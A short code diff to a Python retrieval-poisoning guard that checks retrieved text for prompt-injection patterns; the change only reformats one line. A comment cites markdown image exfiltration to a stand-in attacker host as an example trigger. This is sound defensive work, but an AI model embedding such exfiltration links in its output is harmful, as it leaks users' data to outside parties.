@@ -139,7 +139,9 @@ class RetrievalPoisoningGuard:
         # Check injection detector
         inj_res = self.detector.detect(cleaned)
         if inj_res.is_injection:
-            reasons.append(f"Prompt injection patterns detected: {', '.join(inj_res.matched_rules)}")
+            reasons.append(
+                f"Prompt injection patterns detected: {', '.join(inj_res.matched_rules)}"
+            )
             cleaned = inj_res.sanitized_text
 
         # Check for exfiltration triggers inside text (e.g., markdown image exfiltration: ![img](http://attacker.com/leak?data=...))
